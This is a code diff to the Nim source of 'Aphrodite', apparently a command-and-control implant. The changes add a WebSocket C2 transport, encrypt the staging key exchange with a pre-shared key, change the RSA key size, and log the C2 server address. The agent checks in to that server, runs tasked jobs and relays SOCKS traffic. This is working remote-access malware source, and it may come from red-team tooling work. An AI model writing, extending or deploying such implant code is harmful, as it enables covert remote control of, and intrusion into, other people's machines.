@@ -2,8 +2,8 @@ import std/[json, os, strutils, times, random, base64]
 import config, crypto/aes, core/utils, core/types
 import core/jobs, proxy/socks_mgr
 
-when defined(c2ProfileTcp):
-  import transport/tcp
+when defined(c2ProfileWs):
+  import transport/websocket
 else:
   import transport/http
 
@@ -163,10 +163,10 @@ when defined(useEke):
     let jsonBody = """{"action":"staging_rsa","pub_key":"""" & pubB64 &
                    """","session_id":"""" & sessionId & """"}"""
 
-    stderr.writeLine("[*] EKE: sending staging_rsa (RSA-4096)")
+    stderr.writeLine("[*] EKE: sending staging_rsa (RSA-2048)")
 
-    ## Send WITHOUT encryption — use payloadUUID and empty aesKey
-    let raw = ag.transport.post(ag.payloadUUID, @[], jsonBody)
+    ## Send encrypted with PSK (ag.aesKey set by setupPsk — empty = plaintext)
+    let raw = ag.transport.post(ag.payloadUUID, ag.aesKey, jsonBody)
     if raw.len == 0:
       ctx.ekaFree()
       stderr.writeLine("[!] EKE: no response from server")
@@ -212,6 +212,8 @@ when defined(useEke):
 
 proc checkin(ag: AphroditeAgent): bool =
   when defined(useEke):
+    # Load PSK first — staging_rsa is encrypted with it (empty = plaintext staging)
+    discard ag.setupPsk()
     if not ag.stagingRsa():
       return false
   else:
@@ -407,7 +409,10 @@ proc collectSocksOut(): seq[JsonNode] =
 
 proc run*(ag: AphroditeAgent) =
   stderr.writeLine("[*] Aphrodite starting — UUID=" & ag.payloadUUID)
-  stderr.writeLine("[*] C2: " & C2BaseUrl & C2Endpoint)
+  when defined(c2ProfileWs):
+    stderr.writeLine("[*] C2 (WS): ws://" & WsHost & ":" & $WsPort & "/" & WsPath)
+  else:
+    stderr.writeLine("[*] C2 (HTTP): " & C2BaseUrl & C2Endpoint)
 
   var retries = 0
   while ag.state.running and retries < 10:
